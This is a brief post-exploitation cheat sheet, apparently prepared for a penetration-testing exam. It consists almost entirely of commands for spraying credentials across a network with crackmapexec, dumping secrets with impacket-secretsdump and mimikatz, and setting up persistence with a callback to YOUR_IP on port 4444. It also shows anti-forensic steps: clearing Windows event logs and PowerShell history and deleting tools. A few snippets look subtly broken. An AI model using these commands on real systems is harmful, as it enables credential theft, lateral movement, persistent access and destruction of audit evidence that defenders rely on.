### After Getting Creds
# 1. Immediately rotate through discovered creds
crackmapexec smb $TARGET -u users.txt -p 'discovered_password'

# 2. Check if creds work on other hosts
crackmapexec smb $NETWORK/24 -u user -p pass

# 3. Dump other hosts using discovered creds
impacket-secretsdump domain/user:pass@NEW_TARGET

# 4. Add persistence
python3 persistence.py -t $TARGET -u user -p pass --lhost YOUR_IP --lport 4444 --os windows

# 5. Clean up evidence (if exam allows)
# Remove uploaded tools
del mimikatz.exe
# Clear event logs
wevtutil cl System && wevtutil cl Security && wevtutil cl Application
# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

### Evidence Creation
# Save all findings
mkdir C:\evidence
mimikatz.exe "log C:\evidence\mimikatz.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Extract to structured format
$creds = mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
$creds | ConvertTo-Json | Out-File C:\evidence\creds.json

# Take screenshot of critical findings
# Use snipping tool or built-in screenshot
Start-Process -FilePath "SnippingTool.exe"
Start-Sleep -Seconds 3
[System.Windows.Forms.SendKeys]::SendWait("%{PrintScreen}")  # Alt+PrtScn